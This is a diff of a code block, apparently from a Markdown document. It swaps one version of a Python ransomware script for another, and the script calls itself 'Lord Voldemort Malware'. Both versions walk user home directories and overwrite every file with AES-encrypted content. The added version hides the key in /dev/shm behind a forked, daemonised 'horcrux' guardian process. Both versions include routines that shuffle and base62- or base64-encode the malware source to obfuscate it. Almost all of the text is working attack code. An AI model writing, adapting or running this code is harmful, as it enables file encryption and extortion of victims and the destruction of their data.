@@ -84,81 +84,110 @@ if __name__ == "__main__":
 
 ```
 import os
-import base64
 import random
+import base64
+import base62
+import signal
+import time
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-# === Step 0: Setup
-home_dir = "/home"
-key_filename = "key.horcrux"
-ram_store = {}
+USER_DIR = "/home/skywalker-341"  # update if needed
 
-# === Step 1: Generate AES key & IV
-key = get_random_bytes(32)
-iv = get_random_bytes(16)
-ram_store["key"] = key
-ram_store["iv"] = iv
+KEY_PATH = "/dev/shm/.horcrux_key"
+RESTORE_PATH = "/tmp/.horcrux"
 
-# === Step 2: Encryption Functions
-def pad(data):
-    pad_len = 16 - len(data) % 16
-    return data + bytes([pad_len] * pad_len)
+# AES Encryption (symmetric)
+def encrypt_file(filepath, key):
+    cipher = AES.new(key, AES.MODE_EAX)
+    with open(filepath, 'rb') as f:
+        plaintext = f.read()
+    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+    with open(filepath, 'wb') as f:
+        f.write(cipher.nonce + tag + ciphertext)
 
-def encrypt_file(file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            data = f.read()
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        encrypted = cipher.encrypt(pad(data))
-        with open(file_path, 'wb') as f:
-            f.write(encrypted)
-        print(f"[+] Encrypted: {file_path}")
-    except:
-        print(f"[!] Failed to encrypt: {file_path}")
-
-def encrypt_user_folder(user_folder):
-    for root, dirs, files in os.walk(user_folder):
+# Traverse and encrypt all files in the user directory
+def encrypt_directory(base_path, key):
+    for root, dirs, files in os.walk(base_path):
         for file in files:
-            file_path = os.path.join(root, file)
-            encrypt_file(file_path)
+            try:
+                full_path = os.path.join(root, file)
+                encrypt_file(full_path, key)
+            except Exception as e:
+                print(f"[-] Failed to encrypt {full_path}: {e}")
 
-# === Step 3: Loop Through All Users in /home
-for user in os.listdir(home_dir):
-    user_path = os.path.join(home_dir, user)
-    if os.path.isdir(user_path):
-        print(f"\n[*] Encrypting folder: {user_path}")
-        encrypt_user_folder(user_path)
+# Create fake background "Horcrux" process that lives until killed
+def horcrux_process():
+    def signal_handler(sig, frame):
+        print("[!] Horcrux process killed. Restoring key...")
+        with open(KEY_PATH, 'rb') as f:
+            key = f.read()
+        with open(RESTORE_PATH, 'wb') as f:
+            f.write(key)
+        print(f"[+] Key restored to {RESTORE_PATH}")
+        os._exit(0)
 
-# === Step 4: Delete key from disk (simulated)
-if os.path.exists(key_filename):
-    os.remove(key_filename)
+    signal.signal(signal.SIGTERM, signal_handler)
+    print("[+] Horcrux key protector running. PID:", os.getpid())
 
-# === Step 5: Rearranged Malware Code Obfuscation
-def rearrange_and_map(data: str):
-    indices = list(range(len(data)))
-    shuffled = indices[:]
-    random.shuffle(shuffled)
-    rearranged = ''.join([data[i] for i in shuffled])
-    return rearranged, shuffled
+    # Stay alive forever
+    while True:
+        time.sleep(1)
 
-malware_code = "def horcrux(): pass  # hidden evil"
-rearranged, index_map = rearrange_and_map(malware_code)
+def spawn_horcrux_guard(key):
+    # Save the key in RAM (dev/shm)
+    with open(KEY_PATH, 'wb') as f:
+        f.write(key)
 
-base62_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-def to_base62(num):
-    if num == 0:
-        return "0"
-    base62 = ""
-    while num:
-        base62 = base62_chars[num % 62] + base62
-        num //= 62
-    return base62
+    pid = os.fork()
+    if pid == 0:
+        # In child process: become Horcrux guardian
+        os.setsid()
+        os.execlp("python3", "python3", __file__, "--horcrux")
+    else:
+        print(f"[+] Spawned horcrux process with PID {pid}")
 
-rearranged_b64 = base64.b64encode(rearranged.encode()).decode()
-index_map_b62 = [to_base62(i) for i in index_map]
+# Obfuscate malware script content (optional for later)
+def obfuscate_script(script_path):
+    with open(script_path, "r") as f:
+        script = f.read()
 
-print("\n== Final Horcrux Dump ==")
-print(f"Rearranged (Base64): {rearranged_b64}")
-print(f"Index Map (Base62): {index_map_b62}")
+    chars = list(script)
+    indexes = list(range(len(chars)))
+    random.shuffle(indexes)
+
+    rearranged = ''.join(chars[i] for i in indexes)
+    mapping_str = ','.join(map(str, indexes))
+    final_payload = mapping_str + "||" + rearranged
+    final_encoded = base62.encodebytes(final_payload.encode())
+
+    with open("malware.obfuscated.b62", "wb") as out:
+        out.write(final_encoded)
+
+    print("[+] Malware script obfuscated and saved as Base62.")
+
+# Entry point
+if __name__ == "__main__":
+    import sys
+
+    # If launched with --horcrux flag, run the horcrux guardian
+    if len(sys.argv) > 1 and sys.argv[1] == "--horcrux":
+        horcrux_process()
+        sys.exit(0)
+
+    # Main malware logic
+    print("[*] Starting Lord Voldemort Malware Encryption")
+
+    # 1. Generate symmetric key
+    key = get_random_bytes(16)
+
+    # 2. Encrypt user directory
+    encrypt_directory(USER_DIR, key)
+
+    # 3. Spawn horcrux guard process to protect key
+    spawn_horcrux_guard(key)
+
+    print("[+] Encryption complete. Horcrux is guarding the key in RAM.")
+
+
 ```
